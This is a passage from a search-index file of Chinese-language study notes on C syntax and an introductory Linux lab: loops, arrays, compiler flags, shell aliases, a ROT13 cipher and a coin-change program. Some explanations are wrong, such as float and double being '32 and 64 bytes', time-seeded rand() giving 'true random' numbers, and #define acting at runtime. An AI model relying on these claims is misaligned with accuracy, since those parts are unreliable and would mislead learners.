i+1) {\n// the above introduced a loop-control variable, i\n  .....\n  printf(\"loop number %i\\n\", i);\n  .....\n// variable i is available down to here\n}\n\nfor(char ch = 'a' ; ch &lt;= 'z' ; ch = ch+1) {\n  .....\n  printf(\"loop using character '%c'\\n\", ch);\n  .....\n}\n</code></pre> <p>\u4e09\u4e2a\u53c2\u6570\u4e3a\u8d77\u59cb\u503c\u3001\u505c\u6b62\u6761\u4ef6\uff0c\u6267\u884c\u8fc7\u7a0b\u7b97\u6cd5\uff1b\u53d8\u91cf\u5728 for loop \u5185\u90e8\u4f7f\u7528\u5b8c\u540e\u6d88\u5931</p>"},{"location":"system/c_syntax/#while-do-while-unbounded-loops","title":"while &amp; do while - unbounded loops","text":"<pre><code>#include &lt;stdio.h&gt;\n\n#define NLOOPS 20\n\nint main()\n{\n    int i = 1;\n    int n = 0;\n\n    while (i &lt;= NLOOPS)\n    {\n        printf(\"iteration number %d\\n\", i);\n        // \u66ff\u6362\u6b64\u5904\u4e3a\u5b9e\u9645\u8ba1\u7b97\u65b9\u6cd5\n        i = some_calculation_setting_i;\n        n++;\n    }\n\n    printf(\"loop was traversed %d times\\n\", n);\n\n    return 0;\n}\n</code></pre> <p>\u4e0e Python \u4e00\u6837 while \u7684 expression \u610f\u601d\u4e3a\u53ea\u8981 i &lt;= 20 \u90a3\u5c31\u4fdd\u6301 true \u5982\u679c\u8d85\u8fc7\u8fd9\u4e2a\u8fb9\u754c\u90a3\u5c31 false \u9000\u51fa\u5faa\u73af</p> <pre><code>#include &lt;stdio.h&gt;\n\n#define NLOOPS 20\n\nint main()\n{\n    int i = 1;\n    int n = 0;\n\n    do\n    {\n        printf(\"iteration number %d\\n\", i);\n        // \u66ff\u6362\u6b64\u5904\u4e3a\u5b9e\u9645\u8ba1\u7b97\u65b9\u6cd5\n        i = some_calculation_setting_i;\n        n++;\n    } while (i &lt;= NLOOPS);\n\n    printf(\"loop was traversed %d times\\n\", n);\n\n    return 0;\n}\n</code></pre> <p>\u5f00\u5934 while \u6362\u6210 do \u540e curly bracket \u4e4b\u540e\u52a0\u4e0a while expression \u4e3a do while \u5faa\u73af\uff1b\u4e0e for \u4e0d\u540c\u7684\u662f while \u9700\u4ece\u5916\u90e8\u58f0\u660e\u5f15\u5165\u53d8\u91cf\u7528\u4e8e\u8fed\u4ee3</p>"},{"location":"system/c_syntax/#nest-loop","title":"Nest loop","text":"<pre><code>#define NROWS 6\n#define NCOLS 4\n\nfor(int row = 1 ; row &lt;= NROWS ; row = row+1) {      // the 'outer' loop\n\n    for(int col = 1 ; col &lt;= NCOLS ; col = col+1) {  // the 'inner' loop\n        printf(\"(%i,%i)  \", row, col);               // print row and col as if \"coordinates\"  \n    }\n    printf(\"\\n\");                                    // finish printing on this line\n}\n</code></pre>"},{"location":"system/c_syntax/#define-variables","title":"define &amp; variables","text":"<p>define \u4e3a\u5728\u6267\u884c\u671f\u95f4\u505a\u6587\u672c\u66ff\u6362\uff0c\u5f53\u9700\u8981\u6539\u53d8\u884c\u6570\u6216\u5217\u6570\u65f6\uff0c\u53ea\u9700\u4fee\u6539\u5b9a\u4e49\u7684\u5730\u65b9\uff0c\u800c\u4e0d\u5fc5\u5728\u6574\u4e2a\u4ee3\u7801\u4e2d\u5bfb\u627e\u548c\u4fee\u6539\u76f8\u5e94\u7684\u53d8\u91cf\u5b9a\u4e49\uff1b\u5e76\u4e14\u901a\u5e38\u9759\u6001\u53d8\u91cf\u5728\u7a0b\u5e8f\u8fd0\u884c\u671f\u95f4\u4f1a\u4e00\u76f4\u5b58\u5728\u5185\u5b58\u4e2d</p>"},{"location":"system/c_syntax/#break-continue","title":"break &amp; continue","text":"<pre><code>for(int i = 1 ; i &lt;= 10 ; i = i+1) {\n    // Read an input character from the keyboard\n    .....\n    if(input_char == 'Q') { // Should we quit?\n        break;\n    }\n    .....\n    .....\n}\n// Come here after the 'break'.  i is unavailable\n</code></pre> <p>\u5728\u7528\u6237\u8f93\u5165 Q \u540e\u6574\u4e2a\u7a0b\u5e8f\u76f4\u63a5\u9000\u51fa</p> <pre><code>for(char ch = 'a' ; ch &lt;= 'z' ; ch = ch+1) {\n    if(ch == 'm') { // skip over the character 'm'\n        continue;\n    }\n    .....\n    .....\n    statements that will never see ch == 'm'\n    .....\n    .....\n}\n</code></pre> <p>\u5faa\u73af\u4e2d\u78b0\u5230 m \u540e\u4e0d\u505a\u4efb\u4f55\u64cd\u4f5c\u8df3\u8fc7\u8fdb\u5165\u4e0b\u4e00\u4e2a\u5faa\u73af</p>"},{"location":"system/c_syntax/#infinite-loops","title":"infinite loops","text":"<pre><code>for( ; ; ) {\n    .....\n    .....\n}\n</code></pre> <pre><code>#include &lt;stdbool.h&gt;\n\n// clearer - use this mechanism\nwhile( true ) {\n    .....\n    .....\n}\n</code></pre>"},{"location":"system/c_syntax/#data-structure","title":"Data Structure","text":""},{"location":"system/c_syntax/#array","title":"Array","text":"<p>C \u8bed\u8a00\u4e2d\u5e76\u4e0d\u652f\u6301 Java \u90a3\u6837\u7684 ArraryList \u548c Python \u4e2d list \u90a3\u6837\u7684\u52a8\u6001\u5217\u8868\uff0c\u5e76\u4e14\u652f\u6301\u5f88\u591a\u7684\u529f\u80fd\uff0c\u5176\u53ea\u652f\u6301 Array \u8fd9\u79cd\u6570\u7ec4\uff0c\u5927\u91cf\u529f\u80fd\u81ea\u5df1\u60f3\u529e\u6cd5\u5b9e\u73b0\u3002\u5b9e\u73b0\u65b9\u6cd5\u4e3a\u4ee5\u4e0b\u51e0\u79cd\uff1a</p> <pre><code>int arr[5];\n// \u58f0\u660e\u4e00\u4e2a\u5305\u542b\u4e94\u4e2a\u6574\u6570\u5143\u7d20\u7684\u6570\u7ec4\n\nint arr[5] = {1,2,3,4,5};\n// \u521d\u59cb\u5316\u4e00\u4e2a\u5927\u5c0f\u4e3a\u4e94\u7684\u6574\u6570\u6570\u7ec4\n\nchar str[6] = \"Hello\";\n// \u521d\u59cb\u5316\u4e00\u4e2a\u5927\u5c0f\u4e3a 6 \u7684\u5b57\u7b26\u6570\u7ec4\uff0c\u5305\u542b\u5b57\u7b26\u4e32 \"Hello\" \u548c\u7ed3\u5c3e\u7684\u7a7a\u5b57\u7b26 \\0\n\nint arr[] = {1, 2, 3};\n// \u6570\u7ec4\u5927\u5c0f\u81ea\u52a8\u63a8\u5bfc\u4e3a 3\n\nint arr[5] = {1, 2};\n// \u5269\u4f59\u7684\u5143\u7d20\u5c06\u88ab\u521d\u59cb\u5316\u4e3a 0\n\nint matrix[3][4]; // \u58f0\u660e\u4e00\u4e2a3x4\u7684\u4e8c\u7ef4\u6574\u6570\u6570\u7ec4\nint matrix[3][4] = {\n    {1, 2, 3, 4},\n    {5, 6, 7, 8},\n    {9, 10, 11, 12}\n}; // \u521d\u59cb\u5316\u4e00\u4e2a3x4\u7684\u4e8c\u7ef4\u6570\u7ec4\n</code></pre> <p>\u6700\u540e\u4e00\u4e2a\u4e8c\u7ef4\u6570\u7ec4\u6709\u4e00\u4e9b\u89c4\u5b9a\uff0c\u521d\u59cb\u503c\u63d0\u4f9b\u65f6\uff0c\u6700\u4f4e\u7ef4\u5ea6\u5fc5\u987b\u63d0\u4f9b</p> <pre><code>int arr[][3] = {\n    {1, 2, 3},\n    {4, 5, 6}\n}; // \u6570\u7ec4\u5927\u5c0f\u63a8\u65ad\u4e3a2x3\n</code></pre> <p>\u5f53\u4e0d\u63d0\u4f9b\u521d\u59cb\u503c\u65f6\u6240\u6709\u7ef4\u5ea6\u7684\u5927\u5c0f\u5fc5\u987b\u88ab\u6307\u5b9a</p> <pre><code>int arr[2][3]; // \u6240\u6709\u7ef4\u5ea6\u7684\u5927\u5c0f\u90fd\u5fc5\u987b\u660e\u786e\u6307\u5b9a\n</code></pre>"},{"location":"system/c_syntax/#conclusion","title":"Conclusion","text":"<ul> <li>\u76f8\u6bd4\u4e8e Python, C \u8bed\u8a00\u548c Java \u4e00\u6837\u4e0d\u5728\u4e4e indent</li> <li>C \u63d0\u4f9b\u4e24\u79cd\u6d6e\u70b9\u6570\u636e\u7c7b\u578b float \u548c double \u5206\u522b\u5360\u7528 32 \u4e0e 64 \u5b57\u8282</li> </ul> <p>\u4f46\u5728 system programming \u4e2d\u4e3a\u4e86\u907f\u514d\u7cbe\u5ea6\u9ebb\u70e6\u66f4\u591a\u53ea\u7528\u6574\u6570\u7c7b\u578b\uff1a int, short, long, long long</p>"},{"location":"system/labsheet_1/","title":"2.3 Linux Review","text":""},{"location":"system/labsheet_1/#fri-workshop-1","title":"Fri Workshop 1","text":"<p>Ubuntu \u4ecd\u7136\u662f\u76ee\u524d\u5de5\u4e1a\u754c\u5b89\u5168\u8003\u8651\u8303\u56f4\u5185\u6700\u4f18\u7684\u7cfb\u7edf\uff0c\u63d0\u4f9b LTS \u7248\u672c</p> <pre><code>cal 08 2024\nexpr 90 \\* 2\n</code></pre> <p>\u5176\u4e2d man \u624b\u518c\u4e0d\u540c\u7684 Linux \u53d1\u884c\u5546\u90fd\u7f16\u5199\u4e86\u81ea\u5df1\u7684\u7248\u672c\uff0c\u81ea\u5df1\u6311\u9009\u4e00\u4e2a</p> <p>\u5e38\u89c1 Linux \u547d\u4ee4\u53ef\u4ee5\u5728 Dive into Systems \u8fd9\u672c\u4e66\u4e2d\u627e\u5230</p>"},{"location":"system/labsheet_1/#unix-philosophy","title":"Unix Philosophy","text":"<p>\u4e3a\u4e00\u4e2a\u95ee\u9898\u5199\u4e00\u4e2a\u6700\u597d\u7684\u5de5\u5177\u53bb\u89e3\u51b3\uff0c\u89e3\u51b3\u5176\u4ed6\u95ee\u9898\u7684\u5de5\u5177\u53ef\u4ee5\u8c03\u7528\u8fd9\u4e2a\u5de5\u5177\u4f5c\u4e3a\u7ec4\u4ef6\u89e3\u51b3\u95ee\u9898\uff0c\u548c Apple \u7684\u5f00\u53d1\u54f2\u5b66\u7c7b\u4f3c\u3002</p>"},{"location":"system/labsheet_1/#compiler","title":"Compiler","text":"<p>gcc \u662f\u7531 GNU \u9879\u76ee\u5f00\u53d1\u548c\u7ef4\u62a4\u7684\u7f16\u8bd1\u5668\u96c6\u5408, cc \u662f\u4e00\u4e2a\u7b26\u53f7\u94fe\u63a5\u6307\u5411\u5b83</p> <pre><code>cc -std=c11 -Wall -Werror -o myprogram source.c\n</code></pre> <p><code>-Wall</code> \u542f\u7528\u6240\u6709\u5e38\u89c1\u7684\u7f16\u8bd1\u8b66\u544a\uff0c<code>-Werror</code> \u5c06\u6240\u6709\u8b66\u544a\u89c6\u4e3a\u9519\u8bef</p> <p>\u8be5\u6307\u4ee4\u7528 c11 \u6807\u51c6\u548c\u8b66\u544a\u89c4\u8303\u4e25\u683c\u8fdb\u884c\u7f16\u8bd1\u64cd\u4f5c\uff0c\u7528\u4e8e\u7f16\u5199\u9ad8\u8d28\u91cf\u4ee3\u7801</p>"},{"location":"system/labsheet_1/#labsheet-1","title":"Labsheet 1","text":"<p>\u8be5\u8bfe\u7a0b\u4f1a\u6709\u4e24\u4e2a Projects \u5360\u6bd4 50%</p> <p>Linux \u9996\u9009\u7684\u7f16\u8bd1\u5668\u662f gcc \u800c macOS \u4e3a clang \u5176\u4e3a 2007 \u5e74\u82f9\u679c\u81ea\u4e3b\u7814\u53d1\u7684\u7f16\u8bd1\u5668\u4f5c\u4e3a LLVM \u9879\u76ee\u4e4b\u4e00</p> <p>\u4e24\u8005\u90fd\u53ef\u4ee5\u88ab cc \u76f4\u63a5\u8c03\u7528\uff0c\u53ef\u5728 Terminal \u4e2d\u76f4\u63a5\u6267\u884c</p>"},{"location":"system/labsheet_1/#alias","title":"Alias","text":"<p>Linux \u4e2d\u6709\u4e00\u79cd\u547d\u4ee4\u5feb\u6377\u952e\u7684\u7528\u6cd5\uff0c\u548c Windows \u4e0b\u7684\u73af\u5883\u53d8\u91cf\u7c7b\u4f3c</p> <pre><code>vim ~/.bash_profile\n</code></pre> <pre><code>alias c=\"clear\"\nalias ll=\"ls -l\"\n</code></pre> <pre><code>source ~/.bash_profile\n</code></pre> <p>\u7136\u540e\u5728\u4e0b\u6b21\u767b\u9646\u4f1a\u8bdd\u65f6\uff0c\u7cfb\u7edf\u5c31\u4f1a\u81ea\u52a8\u52a0\u8f7d\u522b\u540d\u673a\u5236\u7136\u540e\u751f\u6548</p>"},{"location":"system/labsheet_1/#rot3","title":"ROT3","text":"<p>\u7ef4\u62a4\u7ed3\u6784\u826f\u597d\u7684\u8ba1\u7b97\u673a\u5b66\u4e60\u76ee\u5f55\u5c42\u6b21\u7ed3\u6784\uff0c\u5212\u5206\u5de5\u4f5c\u903b\u8f91\u5206\u533a</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;ctype.h&gt;\n\n// Compile this program with:\n//    cc -std=c11 -Wall -Werror -o rotate rotate.c\n\n#define ROT 13\n\n//  The rotate function returns the character ROT positions further along the\n//  alphabetic character sequence from c, or c if c is not lower-case\n\nchar rotate(char c)\n{\n    // Check if c is lower-case or not\n    if(islower(c)) {\n        // The ciphered character is ROT positions beyond c,\n        // allowing for wrap-around\n        return ('a' + (c - 'a' + ROT) % 26);\n    }\n    else {\n        return c;\n    }\n}\n\n//  Execution of the whole program begins at the main function\n\nint main(int argcount, char *argvalue[])\n{\n    // Exit with an error if the number of arguments (including\n    // the name of the executable) is not precisely 2\n    if(argcount != 2) {\n        fprintf(stderr, \"%s: program expected 1 argument, but instead received %i\\n\",\n                    argvalue[0], argcount-1);\n        exit(EXIT_FAILURE);\n    }\n    else {\n        // Calculate the length of the first argument\n        int length = strlen(argvalue[1]);\n\n        // Loop for every character in the text\n        for(int i = 0; i &lt; length; i++) {\n            // Determine and print the ciphered character\n            printf(\"%c\", rotate(argvalue[1][i]));\n        }\n\n        // Print one final new-line character\n        printf(\"\\n\");\n\n        // Exit indicating success\n        exit(EXIT_SUCCESS);\n    }\n    return 0;\n}\n</code></pre> <p>\u7f16\u8bd1\u671f\u95f4\u5982\u679c\u4e0d\u63d0\u4f9b <code>-o</code> \u53c2\u6570\u76f4\u63a5 <code>cc rotate.c</code>  \u4f1a\u591a\u51fa\u4e00\u4e2a a.out \u53ef\u6267\u884c\u6587\u4ef6\uff0c<code>a.out</code> \u4e3a\u9ed8\u8ba4\u540d</p> <p>\u4e3a\u4e86\u4e25\u683c\u7f16\u8bd1\u6240\u6709 C11 \u7a0b\u5e8f\uff0c\u6574\u4e2a Lab \u5c06\u91c7\u7528\u4ee5\u4e0b\u7f16\u8bd1\u53c2\u6570\u6267\u884c\uff1a</p> <pre><code>cc -std=c11 -Wall -Werror -o rotate rotate.c\n</code></pre> <p>\u7ed3\u5408 vim \u63d0\u4f9b\u7684 alias \u529f\u80fd\uff0c\u53ef\u901a\u8fc7\u7f16\u8f91 <code>~/.bash_profile</code> \u6dfb\u52a0\u4ee5\u4e0b\u884c\u7b80\u5316\u7f16\u8bd1\u6d41\u7a0b</p> <pre><code>alias mycc=\"cc -std=c11 -Wall -Werror\"\nsource ~/.bash_profile\n</code></pre> <p>\u65e5\u540e\u7684\u7f16\u8bd1\u6d41\u7a0b\u5c31\u76f4\u63a5\u80fd\u7b80\u5316\u6210\uff1a</p> <pre><code>mycc -o rotate rotate.c\n</code></pre>"},{"location":"system/labsheet_1/#linux-commands","title":"Linux Commands","text":"<p>\u9664\u53bb\u5e38\u89c1\u6eda\u74dc\u70c2\u719f\u7684\u6307\u4ee4\u6a21\u5f0f\uff1a</p> <pre><code>man -k vim\n# -k \u5217\u51fa\u6240\u6709 vim \u7b80\u8ff0\n\nls -lt \n# \u6309\u7167\u65f6\u95f4\u6392\u5e8f\n\nls -lR\n# \u591a\u6587\u4ef6\u5939\u5faa\u73af\u5217\u4e3e\n\ncp -R olddir newdir\n# \u591a\u6587\u4ef6\u5939\u5faa\u73af\u62f7\u8d1d\n\ndu -sh dirname\n# \u7528\u4eba\u6027\u5316\u683c\u5f0f\u663e\u793a\u8be5\u6587\u4ef6\u5939\u78c1\u76d8\u4f7f\u7528\u72b6\u51b5\n\ncat -s filename\n# \u53bb\u7a7a\u884c\u67e5\u770b\u6587\u4ef6\n\nhead -3 filename \nhead -c 100 filename\ntail -3 filename\ntail -c 100 filename\n# \u4ece\u6587\u4ef6\u5f00\u5934\u6216\u7ed3\u5c3e\u9605\u8bfb\u7279\u5b9a\u884c\u6216\u5b57\u6570\n\nwc -l filename\n# \u9ed8\u8ba4\u662f\u663e\u793a\u5b57\u6570\u3001\u5355\u8bcd\u6570\u548c\u884c\u6570\uff0c-l \u662f\u6587\u4ef6\u884c\u6570\n\ngrep pattern filename\ngrep -c pattern filename\n# \u663e\u793a\u5339\u914d\u8fd9\u79cd\u6a21\u5f0f\u7684\u6b21\u6570\ngrep -i pattern filename\n# \u5ffd\u7565\u6587\u4ef6\u5927\u5c0f\u5199\n\nps aux\n# \u6240\u6709\u8fdb\u7a0b\u548c\u5c5e\u6027\n</code></pre>"},{"location":"system/labsheet_1/#1-integer-arithmetic","title":"1. Integer Arithmetic","text":"<p>\u6fb3\u5927\u5229\u4e9a\u8d85\u5e02\u627e\u96f6\u5c0f\u7a0b\u5e8f\uff0c\u8f93\u5165\u5546\u54c1\u4ef7\u683c\u8f93\u51fa\u652f\u4ed8 100 \u5206\u540e\u5f97\u5230\u7684\u627e\u96f6\u4fe1\u606f\uff0c\u627e\u96f6\u786c\u5e01\u79cd\u7c7b\u6709 1c 2c 5c 10c 20c 50c</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main(int const argc, char *argv[]) {\n    // argc \u4ee3\u8868\u7684\u53c2\u6570\u6570\u91cf\uff0cargv \u50a8\u5b58\u6240\u6709\u53c2\u6570\n    // %dn means a integer with a line break\n    if (argc != 2) {\n        printf(\"Format Error, please use ./change cents.\\n\");\n        return 0;\n    }\n\n    int const price = atoi(argv[1]);\n\n    if (price &lt;= 0 || price &gt; 100) {\n        printf(\"Data Type Error, please use int and the price needs to &lt;= 100.\\n\");\n        return 0;\n    }\n\n    int change = 100 - price;\n    int const coin_50 = change / 50;\n    change = change % 50;\n    int const coin_20 = change / 20;\n    change = change % 20;\n    int const coin_10 = change / 10;\n    change = change % 10;\n    int const coin_5 = change / 5;\n    change = change % 5;\n    int const coin_2 = change / 2;\n    change = change % 2;\n    int const coin_1 = change / 1;\n    printf(\"%d 50c, %d 20c, %d 10c, %d 5c, %d 2c, %d 1c for changes.\\n\", coin_50, coin_20,\n    coin_10, coin_5, coin_2, coin_1);\n}\n</code></pre> <p>\u8fd9\u9053\u9898\u662f\u8d2a\u5fc3\u7b97\u6cd5\u548c\u52a8\u6001\u89c4\u5212\u5e38\u8003\u7684\u9898\uff0c\u4f46\u662f\u5728\u4e0d\u7528\u7b97\u6cd5\u7684\u60c5\u51b5\u4e0b\uff0c\u53ea\u80fd\u624b\u52a8\u66f4\u65b0\u4f59\u989d\u5e76\u624b\u52a8\u964d\u5e8f\u53d6\u4f59\u6570\u6700\u7ec8\u6574\u4f53\u5c06\u7b54\u6848\u7b54\u5e94\u51fa\u6765\uff1b\u7a0b\u5e8f\u5728\u7f16\u5199\u8fc7\u7a0b\u4e2d\u7406\u89e3\u4e86 C \u7684\u4e00\u4e9b\u7ec6\u8282\uff1a</p> <ol> <li> <p><code>printf</code> \u7b2c\u4e00\u4e2a\u53c2\u6570\u5fc5\u987b\u4e3a\u5b57\u7b26\u4e32\uff0c\u6240\u6709\u7684\u62fc\u63a5\u90fd\u662f\u7528 % \u5f00\u5934\u7684\u66ff\u6362\u7b26\u62fc\u63a5\u4e0a\u53bb</p> </li> <li> <p>argc \u4e3a arg count \u4e5f\u5c31\u662f\u6570\u91cf\uff0c./main \u7b97 argv[0] \u56e0\u6b64\u7b97\u4e24\u4e2a</p> </li> <li> <p>argv \u4e3a char \u6570\u7ec4, char * \u4e3a\u6307\u9488\u6307\u5411\u5176\u4e2d\u7684\u4e00\u4e2a char</p> </li> <li> <p>In C, you cannot directly cast a string (which argv[1] is, as a char *) to an int because a string is a sequence of characters (a pointer) and not directly an integer value. </p> </li> </ol> <p>\u7531\u4e8e\u76f4\u63a5\u5185\u5b58\u7ba1\u7406\u548c\u5e95\u5c42\u7684\u6570\u636e\u7c7b\u578b\u8f6c\u6362\u8bbe\u8ba1\uff0cC \u8bed\u8a00\u5e76\u4e0d\u652f\u6301\u50cf Python \u4e00\u6837\u76f4\u63a5\u8f6c\u6362\u6570\u636e\u7c7b\u578b\uff0c\u9700\u8981\u7528 atoi \u8fd9\u4e2a\u5305\u5c06 pointer \u627e\u5230\u540e\u6210\u529f\u8f6c\u6362\u3002<code>char str[] = \"Hello, World!\";</code> \u4e3a\u5b57\u7b26\u4e32\u6570\u636e\u7c7b\u578b\u58f0\u660e\u65b9\u5f0f\u3002 </p>"},{"location":"system/labsheet_1/#2-call-system-date-function","title":"2. Call system date function","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main() {\n    printf(\"%d\",system(\"date\"));\n    return 0;\n}\n</code></pre> <p>\u8c03\u7528\u7cfb\u7edf\u4f9d\u7136\u82f1 <code>stdlib</code> \u5305\u4e2d\u7684 <code>system</code> \u51fd\u6570\uff0cdate \u7684\u8f93\u51fa\u6709\u610f\u601d\u7684\u662f\u6574\u6570\uff0c\u5e76\u4e14\u7a0b\u5e8f\u8f93\u51fa\u540e\u4f1a\u7b54\u5e94\u4e00\u4e2a 0, \u8fd9\u662f\u4ee3\u8868 the date command executed successfully with an exit status of 0.</p>"},{"location":"system/labsheet_1/#4-array","title":"4. Array","text":"<p>\u968f\u673a\u5927\u4e50\u900f\u6d17\u724c\u7a0b\u5e8f</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;time.h&gt;\n\nint main() {\n    srand(time(NULL));\n    int result[6];\n    for (int i = 0; i &lt; 6; i++) {\n        int const ranNum = rand() % 100;\n        result[i] = ranNum;\n        printf(\"%d\\n\", result[i]);\n    }\n}\n</code></pre> <p>\u8ba1\u7b97\u673a\u79d1\u5b66\u9886\u57df\u6709\u771f\u968f\u673a\u6570\u548c\u4f2a\u968f\u673a\u6570\u7684\u6982\u5ff5\uff0c\u4e3a\u4e86\u4fdd\u8bc1\u6bcf\u6b21\u751f\u6210\u7684\u6570\u4e3a\u771f\u968f\u673a\uff0c\u5bfc\u5165 <code>time(NULL)</code> \u8fd4\u56de\u4e00\u4e2a time_t \u7c7b\u578b\u7684\u503c\uff0c\u8868\u793a\u5f53\u524d\u65f6\u95f4\u4e0e Unix \u7eaa\u5143 (1970\u5e741\u67081\u65e500:00:00 UTC) \u7684\u79d2\u5dee\u503c\uff0c\u6570\u636e\u7c7b\u578b\u4e3a long int \u6253\u5370\u7528 <code>%ld</code>\u3002\u8fd9\u6837\u6bcf\u4e00\u6b21\u83b7\u53d6\u968f\u673a\u6570\u7684\u65f6\u5019\uff0c\u751f\u6210\u79cd\u5b50\u90fd\u662f\u4e0d\u4e00\u6837\u7684\uff0c<code>%</code> \u80fd\u591f\u4fdd\u8bc1\u65e0\u8bba\u591a\u5927\u7684\u968f\u673a\u6570\u6700\u7ec8\u90fd\u80fd\u63a7\u5236\u5728 0 ~ 100 \u7684\u8303\u56f4\u4e4b\u5185\u3002</p>"},{"location":"system/labsheet_1/#tasks","title":"Tasks","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;ctype.h&gt;\n\n// Compile this program with:\n//    cc -std=c11 -Wall -Werror -o rotate rotate.c\n\n#define ROT 13\n\n//  The rotate function returns the character ROT positions further along the\n//  alphabetic character sequence from c, or c if c is not lower-case\n\nchar rotate(char c)\n{\n    // Check if c is lower-case or not\n    if(islower(c)) {\n        // The ciphered character is ROT positions beyond c,\n        // allowing for wrap-around\n        return ('a' + (c - 'a' + ROT) % 26);\n    }\n    else {\n        return c;\n    }\n}\n\n//  Execution of the whole program begins at the main function\n\nint main(int argcount, char *argvalue[])\n{\n    // Exit with an error if the number of arguments (including\n    // the name of the executable) is not precisely 2\n    if(argcount != 2) {\n        fprintf(stderr, \"%s: program expected 1 argument, but instead received %i\\n\",\n                    argvalue[0], argcount-1);\n        exit(EXIT_FAILURE);\n    }\n    else {\n        // Calculate the length of the first argument\n        int length = strlen(argvalue[1]);\n\n        // Loop for every character in the text\n        for(int i = 0; i &lt; length; i++) {\n            // Determine and print the ciphered character\n            printf(\"%c\", rotate(argvalue[1][i]));\n        }\n\n        // Print one final new-line character\n        printf(\"\\n\");\n\n        // Exit indicating success\n        exit(EXIT_SUCCESS);\n    }\n    return 0;\n}\n</code></pre>"},{"location":"system/labsheet_1/#rot-13-rot-3","title":"ROT 13 -&gt; ROT 3","text":"<p>\u7b2c 9 \u884c\u7684 13 \u6539\u4e3a 3, 45 \u884c\u52a0\u4e2a\u6362\u884c\u7b26</p>"},{"location":"system/labsheet_1/#position","title":"POSITION","text":"<pre><code>printf(\"%c, %c\\n\", argvalue[1][i], rotate(argvalue[1][i]));\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230 char \u7528\u7684\u89e3\u6790\u7b26\u53f7\u4e3a <code>%c</code> </p>"},{"location":"system/labsheet_1/#original-char","title":"ORIGINAL CHAR","text":"<pre><code>printf(\"%c, %c, %d\\n\", argvalue[1][i], rotate(argvalue[1][i]), i + 1);\n</code></pre>"},{"location":"system/labsheet_1/#deal-with-capital-char","title":"DEAL WITH CAPITAL CHAR","text":"<pre><code>char rotate(char c)\n{\n    // Check if c is lower-case or not\n    if(islower(c)) {\n        // The ciphered character is ROT positions beyond c,\n        // allowing for wrap-around\n        return ('a' + (c - 'a' + ROT) % 26);\n    }\n    return ('A' + (c - 'A' + ROT) % 26);\n}\n</code></pre>"},{"location":"system/labsheet_1/#explanation","title":"Explanation","text":"<pre><code>#include &lt;stdio.h&gt;\n</code></pre> <p>\u4e3b\u8981\u5728\u4ee3\u7801\u4e2d\u652f\u6301 <code>fprintf</code> <code>printf</code> \u4e24\u4e2a\u51fd\u6570\uff0cfprintf \u80fd\u591f\u5b9a\u4e49\u6307\u5b9a\u7684\u8f93\u51fa\u6d41\uff0c\u5728\u5185\u5b58\u4e2d\u6253\u5370\uff0c\u53ef\u4ee5\u5728 buffer \u7f51\u7edc\u4e2d\u64cd\u4f5c\u7b49\u7b49</p> <pre><code>int fprintf(FILE *stream, const char *format, ...);\n</code></pre> <pre><code>fprintf(stderr, \"An error occurred: %s\\n\", \"File not found\");\n</code></pre> <p>\u4ee3\u7801\u4e2d\u5b9a\u4e49\u6807\u51c6\u9519\u8bef\u8f93\u51fa\u4e3a\u6b64\u63d0\u793a</p> <p>\u6807\u51c6\u6d41\uff1a</p> <ul> <li>stderr\uff1a\u6807\u51c6\u9519\u8bef\u6d41\uff0c\u901a\u5e38\u7528\u4e8e\u8f93\u51fa\u9519\u8bef\u4fe1\u606f\u3002</li> <li>stdout\uff1a\u6807\u51c6\u8f93\u51fa\u6d41\uff0c\u901a\u5e38\u7528\u4e8e\u6b63\u5e38\u8f93\u51fa\u3002</li> <li> <p>stdin\uff1a\u6807\u51c6\u8f93\u5165\u6d41\uff0c\u901a\u5e38\u7528\u4e8e\u83b7\u53d6\u7528\u6237\u8f93\u5165\u3002</p> </li> <li> <p>scanf\uff1a\u7528\u4e8e\u4ece\u6807\u51c6\u8f93\u5165\u6d41\u8bfb\u53d6\u683c\u5f0f\u5316\u8f93\u5165\u3002</p> </li> <li> <p>fopen\uff1a\u7528\u4e8e\u6253\u5f00\u4e00\u4e2a\u6587\u4ef6\u4ee5\u8fdb\u884c\u8bfb\u53d6\u6216\u5199\u5165\u3002</p> </li> <li> <p>fclose\uff1a\u7528\u4e8e\u5173\u95ed\u4e00\u4e2a\u6253\u5f00\u7684\u6587\u4ef6\u3002</p> </li> <li> <p>fgets\uff1a\u7528\u4e8e\u4ece\u6587\u4ef6\u6d41\u4e2d\u8bfb\u53d6\u4e00\u884c\u6587\u672c\u3002</p> </li> </ul> <pre><code>#include &lt;stdlib.h&gt;\n\n// \u7528\u4e8e\u4ee5\u4e0b\u4e24\u4e2a\u51fd\u6570\nexit(EXIT_SUCCESS);\nexit(EXIT_FAILURE);\n</code></pre> <p>\u662f C \u8bed\u8a00\u4e2d\u7684\u4e00\u4e2a\u51fd\u6570\u8c03\u7528\uff0c\u7528\u4e8e\u7ec8\u6b62\u5f53\u524d\u7a0b\u5e8f\u5e76\u8fd4\u56de\u4e00\u4e2a\u72b6\u6001\u7801\u7ed9\u64cd\u4f5c\u7cfb\u7edf\u3002</p> <pre><code>#include &lt;string.h&gt;\n\n// strlen() \u51fd\u6570\u8c03\u7528\u8ba1\u7b97 char \u5b57\u7b26\u957f\u5ea6\n</code></pre> <pre><code>#include &lt;ctype.h&gt;\n\n// islower() \n</code></pre> <p>ctype \u4e3b\u8981\u7528\u4e8e\u5904\u7406\u5b57\u7b26\u7684\u5206\u7c7b\u548c\u8f6c\u6362\uff0c\u5b83\u63d0\u4f9b\u4e86\u4e00\u7cfb\u5217\u51fd\u6570\uff0c\u7528\u4e8e\u68c0\u67e5\u5b57\u7b26\u7684\u7c7b\u578b\uff08\u5982\u5b57\u6bcd\u3001\u6570\u5b57\u3001\u7a7a\u767d\u5b57\u7b26\u7b49\uff09\u4ee5\u53ca\u5c06\u5b57\u7b26\u8fdb\u884c\u5927\u5c0f\u5199\u8f6c\u6362\u7b49\u64cd\u4f5c\u3002</p>"},{"location":"system/workshop_2/","title":"2.4 MyCal","text":""},{"location":"system/workshop_2/#fri-workshop-2","title":"Fri Workshop 